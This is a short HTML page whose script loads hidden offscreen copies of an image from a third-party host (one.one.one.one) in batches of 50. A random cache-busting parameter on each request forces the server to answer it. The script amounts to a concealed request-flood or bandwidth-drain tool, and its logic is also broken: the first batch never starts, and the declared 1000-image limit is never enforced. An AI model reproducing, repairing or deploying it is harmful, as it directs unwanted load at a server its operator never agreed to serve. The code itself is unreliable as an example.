<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Controlled Image Load</title>
  <style>
    /* Prevent images from being visible, but still force the download */
    .offscreen {
      position: absolute;
      left: -9999px;
      top: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>
  <h1>Loading 1000 Images...</h1>

  <script>
    const baseUrl = 'https://one.one.one.one/media/card.png';
    const imagesPerBatch = 50; // Load 50 new images once 50 previous ones have finished
    const totalImages = 1000; // Total number of images to load
    const container = document.createElement('div'); // Container to append images
    document.body.appendChild(container);

    let loadedImages = 0; // Counter for successfully loaded images

    // Function to track and load new images
    function loadImages() {
      // Only load new images if 50 previous images are fully loaded
      if (loadedImages >= imagesPerBatch) {
        loadedImages = 0; // Reset the loaded count once we load new images

        for (let i = 0; i < imagesPerBatch; i++) {
          const img = new Image();
          const cacheBuster = `${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
          img.src = `${baseUrl}?cb=${cacheBuster}`; // Unique URL to bypass cache
          img.className = 'offscreen'; // Off-screen but downloading

          // Log each image request
          console.log('Image requested:', img.src);

          img.onload = () => {
            loadedImages++;
            // Log successful image load
            console.log('Image loaded:', img.src);

            // If 50 images have been loaded, trigger the next batch load
            if (loadedImages === imagesPerBatch) {
              setTimeout(loadImages, 1000); // Start loading the next 50 images
            }
          };

          img.onerror = (error) => {
            // Log errors (e.g., failed image loading)
            console.error('Error loading image:', img.src);
            loadedImages++; // Count the error image to prevent blocking the loop
          };

          container.appendChild(img); // Append to the DOM (to trigger download)
        }
      }
    }

    loadImages(); // Start loading images once
  </script>
</body>
</html>
